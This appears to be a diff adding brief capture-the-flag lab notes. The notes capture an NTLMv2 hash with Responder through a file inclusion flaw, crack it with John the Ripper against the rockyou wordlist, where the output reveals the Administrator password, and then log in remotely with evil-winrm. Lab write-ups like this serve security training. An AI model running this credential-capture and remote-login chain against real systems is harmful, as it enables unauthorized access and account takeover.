@@ -1,0 +1,19 @@
+reponder -I tun0
+run file inclusion get hash 
+run hash through john
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+badminton        (Administrator)     
+1g 0:00:00:01 DONE (2022-09-20 16:03) 0.8403g/s 3442p/s 3442c/s 3442C/s slimshady..oooooo
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed.
+
+
+ evil-winrm -i 10.129.168.4 -u administrator -p badminton
+
+ 
+
